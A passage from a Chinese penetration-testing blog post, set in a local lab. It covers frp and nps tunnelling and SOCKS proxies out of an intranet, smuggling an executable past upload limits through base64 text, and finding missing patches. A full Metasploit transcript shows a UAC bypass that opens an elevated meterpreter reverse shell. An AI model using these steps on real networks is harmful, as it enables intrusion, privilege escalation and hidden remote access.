<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="内网笔记0x03, ezy&#39;s blog">
    <meta name="description" content="0x11 frp 的使用1、介绍在实战中，大家较多使用的也是 frp，frp 项目地址：https://github.com/fatedier/frp
下载安装直接在项目的 releases 里下载自己对应的系统版本就行
2、使用官方使用文">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>内网笔记0x03 | ezy&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">ezy&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">ezy&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">内网笔记0x03</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%86%85%E7%BD%91/">
                                <span class="chip bg-color">内网</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
                                渗透测试
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-10-26
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-10-26
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    35 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="0x11-frp-的使用"><a href="#0x11-frp-的使用" class="headerlink" title="0x11 frp 的使用"></a>0x11 frp 的使用</h2><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p>下载安装直接在项目的 releases 里下载自己对应的系统版本就行</p>
<h3 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h3><p>官方使用文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
<p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p>
<blockquote>
<p>以下环境均为本地环境</p>
<p>VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p>
</blockquote>
<h4 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h4><p>场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p>
<p>在 VPS 上开启服务端，这里以 kali 为例</p>
<p>首先修改配置文件 frps.ini</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
bind_port <span class="token operator">=</span> <span class="token number">4444</span></code></pre>
<p>然后启动服务端</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">frps -c frps.ini

<span class="token operator">></span> ./frps -c frps.ini
<span class="token number">2021</span>/06/09 03:45:03 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>root.go:200<span class="token punctuation">]</span> frps uses config file: frps.ini
<span class="token number">2021</span>/06/09 03:45:03 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>service.go:192<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:4444
<span class="token number">2021</span>/06/09 03:45:03 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>root.go:209<span class="token punctuation">]</span> frps started successfully</code></pre>
<p>配置客户端配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
<span class="token comment"># 服务端 IP</span>
server_addr <span class="token operator">=</span> vps_ip
<span class="token comment"># 服务端端口</span>
server_port <span class="token operator">=</span> <span class="token number">4444</span>

<span class="token punctuation">[</span>rdp<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
local_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1
local_port <span class="token operator">=</span> <span class="token number">3389</span>
<span class="token comment"># 连接 vps 的端口</span>
remote_port <span class="token operator">=</span> <span class="token number">3389</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> .<span class="token punctuation">\</span>frpc.exe -c frpc.ini
<span class="token number">2021</span>/06/09 <span class="token number">15</span>:50:29 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>service.go:304<span class="token punctuation">]</span> <span class="token punctuation">[</span>72904e8037a7fdf8<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>72904e8037a7fdf8<span class="token punctuation">]</span>, server udp port <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token number">2021</span>/06/09 <span class="token number">15</span>:50:29 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>proxy_manager.go:144<span class="token punctuation">]</span> <span class="token punctuation">[</span>72904e8037a7fdf8<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>rdp<span class="token punctuation">]</span>
<span class="token number">2021</span>/06/09 <span class="token number">15</span>:50:29 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>control.go:180<span class="token punctuation">]</span> <span class="token punctuation">[</span>72904e8037a7fdf8<span class="token punctuation">]</span> <span class="token punctuation">[</span>rdp<span class="token punctuation">]</span> start proxy success</code></pre>
<p>在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了</p>
<h4 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h4><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
<p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
<p>在 VPS 上开启服务端，服务端配置文件如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
bind_port <span class="token operator">=</span> <span class="token number">4444</span>

<span class="token comment"># 客户端认证 token</span>
token <span class="token operator">=</span> <span class="token number">123456</span>

<span class="token comment"># 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码</span>
dashboard_port <span class="token operator">=</span> <span class="token number">8000</span>
dashboard_user <span class="token operator">=</span> admin
dashboard_pwd <span class="token operator">=</span> password</code></pre>
<blockquote>
<p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p>
</blockquote>
<p>配置好文件后，启动服务端</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">frps -c frps.ini

<span class="token operator">></span> ./frps -c frps.ini
<span class="token number">2021</span>/06/09 04:06:34 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>root.go:200<span class="token punctuation">]</span> frps uses config file: frps.ini
<span class="token number">2021</span>/06/09 04:06:35 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>service.go:192<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:4444
<span class="token number">2021</span>/06/09 04:06:35 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>service.go:294<span class="token punctuation">]</span> Dashboard listen on <span class="token number">0.0</span>.0.0:8000
<span class="token number">2021</span>/06/09 04:06:35 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>root.go:209<span class="token punctuation">]</span> frps started successfully</code></pre>
<p>配置客户端文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
server_addr <span class="token operator">=</span> vps_ip
server_port <span class="token operator">=</span> <span class="token number">4444</span>

<span class="token comment"># 客户端认证 token，需要和服务端 token 保持一致</span>
token <span class="token operator">=</span> <span class="token number">123456</span>


<span class="token comment"># 启用加密，防止流量被拦截</span>
use_encryption <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token comment"># 启用压缩，提升流量转发速度</span>
use_compression <span class="token operator">=</span> <span class="token boolean">true</span>

<span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
<span class="token comment"># 连接 vps 的端口</span>
remote_port <span class="token operator">=</span> <span class="token number">1080</span>
plugin <span class="token operator">=</span> socks5</code></pre>
<p>开启客户端</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">frpc -c frpc.ini

<span class="token operator">></span> .<span class="token punctuation">\</span>frpc.exe -c frpc.ini
<span class="token number">2021</span>/06/09 <span class="token number">16</span>:11:21 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>service.go:304<span class="token punctuation">]</span> <span class="token punctuation">[</span>ee7ad330ab4e6036<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>ee7ad330ab4e6036<span class="token punctuation">]</span>, server udp port <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token number">2021</span>/06/09 <span class="token number">16</span>:11:21 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>proxy_manager.go:144<span class="token punctuation">]</span> <span class="token punctuation">[</span>ee7ad330ab4e6036<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>
<span class="token number">2021</span>/06/09 <span class="token number">16</span>:11:21 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>control.go:180<span class="token punctuation">]</span> <span class="token punctuation">[</span>ee7ad330ab4e6036<span class="token punctuation">]</span> <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span> start proxy success</code></pre>
<p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了</p>
<p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></p>
<h2 id="0x12-nps-的使用"><a href="#0x12-nps-的使用" class="headerlink" title="0x12 nps 的使用"></a>0x12 nps 的使用</h2><h3 id="1、介绍-1"><a href="#1、介绍-1" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>nps 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了</p>
<h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例</p>
<p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -zxvf linux_amd64_server.tar.gz
./nps <span class="token function">install</span></code></pre>
<h3 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h3><p>官方使用文档：<a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p>
<p>启动服务端，默认 Web 管理界面端口 8080</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nps start</code></pre>
<p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录</p>
<p>首先新增一个客户端，点击 “客户端” —&gt; “新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p>
<p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”能直接看到在客户端上要运行的命令</p>
<p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线</p>
<p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”—&gt; “新增”，输入客户端的 ID 和代理的端口，然后新增即可</p>
<p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码</p>
<p><a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a></p>
<h2 id="0x13-内网中绕过无法上传文件限制"><a href="#0x13-内网中绕过无法上传文件限制" class="headerlink" title="0x13 内网中绕过无法上传文件限制"></a>0x13 内网中绕过无法上传文件限制</h2><h3 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h3><p>目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码</p>
<h3 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h3><p>使用 PowerShell 进行 base64 编码</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$PEBytes</span> = <span class="token namespace">[System.IO.File]</span>::ReadAllBytes<span class="token punctuation">(</span><span class="token string">"fscan.exe"</span><span class="token punctuation">)</span>
<span class="token variable">$Base64Payload</span> = <span class="token namespace">[System.Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$PEBytes</span><span class="token punctuation">)</span>
<span class="token function">Set-Content</span> fscan_base64<span class="token punctuation">.</span>txt <span class="token operator">-</span>Value <span class="token variable">$Base64Payload</span></code></pre>
<p>使用 PowerShell 进行 base64 解码</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$Base64Bytes</span> = <span class="token function">Get-Content</span> <span class="token punctuation">(</span><span class="token string">"fscan_base64.txt"</span><span class="token punctuation">)</span>
<span class="token variable">$PEBytes</span>= <span class="token namespace">[System.Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Base64Bytes</span><span class="token punctuation">)</span>
<span class="token namespace">[System.IO.File]</span>::WriteAllBytes<span class="token punctuation">(</span><span class="token string">"fscan_base64.exe"</span><span class="token punctuation">,</span><span class="token variable">$PEBytes</span><span class="token punctuation">)</span></code></pre>
<h3 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h3><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">使用 CertUtil 进行编码
CertUtil -encode fscan.exe fscan_base64.txt
使用 CertUtil 进行解码
CertUtil -decode fscan_base64.txt fscan_base64.exe</code></pre>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a></p>
<h2 id="0x14-发现主机缺失补丁"><a href="#0x14-发现主机缺失补丁" class="headerlink" title="0x14 发现主机缺失补丁"></a>0x14 发现主机缺失补丁</h2><h3 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h3><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作</p>
<h3 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h3><h4 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h4><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁</p>
<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">wmic qfe get Caption,Description,HotfixID,InstalledOn
C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>teamssix<span class="token operator">></span>wmic qfe get Caption,Description,HotfixID,InstalledOn

Caption                                     Description  HotFixID   InstalledOn
http://support.microsoft.com/?kbid<span class="token operator">=</span><span class="token number">2999226</span>  Update       KB2999226  <span class="token number">11</span>/26/2020
http://support.microsoft.com/?kbid<span class="token operator">=</span><span class="token number">976902</span>   Update       KB976902   <span class="token number">11</span>/21/2010</code></pre>
<p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了</p>
<h3 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h3><h4 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h4><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本</p>
<p>Sherlock 项目地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>导入脚本</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\Sherlock<span class="token punctuation">.</span>ps1</code></pre>
<p>Sherlock 命令</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Find-ALLVulns</span>   搜索所有未安装的补丁
Find<span class="token operator">-</span>MS16032    搜索单个漏洞</code></pre>
<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> use post/windows/gather/enum_patches

msf6 post<span class="token punctuation">(</span>windows/gather/enum_patches<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>

msf6 post<span class="token punctuation">(</span>windows/gather/enum_patches<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> KB2999226 installed on <span class="token number">11</span>/26/2020
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> KB976902 installed on <span class="token number">11</span>/21/2010
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Post module execution completed</code></pre>
<p>使用 MSF 发现目标可用提权漏洞，然后进行提权</p>
<p>首先查看下当前会话权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 post<span class="token punctuation">(</span>windows/gather/enum_patches<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> execute -if <span class="token string">"whoami /groups"</span>
Process <span class="token number">3048</span> created.
Channel <span class="token number">6</span> created.

组信息
-----------------
<span class="token punctuation">..</span>.
Mandatory Label<span class="token punctuation">\</span>Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组</code></pre>
<p>使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> background
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Backgrounding session <span class="token number">1</span><span class="token punctuation">..</span>.

msf6 post<span class="token punctuation">(</span>windows/gather/enum_patches<span class="token punctuation">)</span> <span class="token operator">></span> use post/multi/recon/local_exploit_suggester
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">172.16</span>.214.4 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x86/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">172.16</span>.214.4 - <span class="token number">38</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">172.16</span>.214.4 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Post module execution completed</code></pre>
<p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> use exploit/windows/local/bypassuac_eventvwr
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload windows/meterpreter/reverse_tcp

msf6 exploit<span class="token punctuation">(</span>windows/local/bypassuac_eventvwr<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>

msf6 exploit<span class="token punctuation">(</span>windows/local/bypassuac_eventvwr<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.101</span>.22.38:4444
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> UAC is Enabled, checking level<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Part of Administrators group<span class="token operator">!</span> Continuing<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> UAC is <span class="token builtin class-name">set</span> to Default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> BypassUAC can bypass this setting, continuing<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Configuring payload and stager registry keys <span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing payload: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>eventvwr.exe
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> eventvwr.exe executed successfully, waiting <span class="token number">10</span> seconds <span class="token keyword">for</span> the payload to execute.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">175174</span> bytes<span class="token punctuation">)</span> to <span class="token number">172.16</span>.214.4
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">10.101</span>.22.38:4444 -<span class="token operator">></span> <span class="token number">172.16</span>.214.4:49160<span class="token punctuation">)</span> at <span class="token number">2021</span>-07-06 <span class="token number">15</span>:38:08 +0800
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up registry keys <span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> execute -if <span class="token string">"whoami /groups"</span>
Process <span class="token number">3048</span> created.
Channel <span class="token number">1</span> created.
<span class="token punctuation">..</span>.
Mandatory Label<span class="token punctuation">\</span>High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组</code></pre>
<p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限</p>
<h4 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h4><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富</p>
<p>wesng 的安装</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/bitsadmin/wesng.git
<span class="token builtin class-name">cd</span> wesng
python wes.py --update</code></pre>
<p>直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中</p>
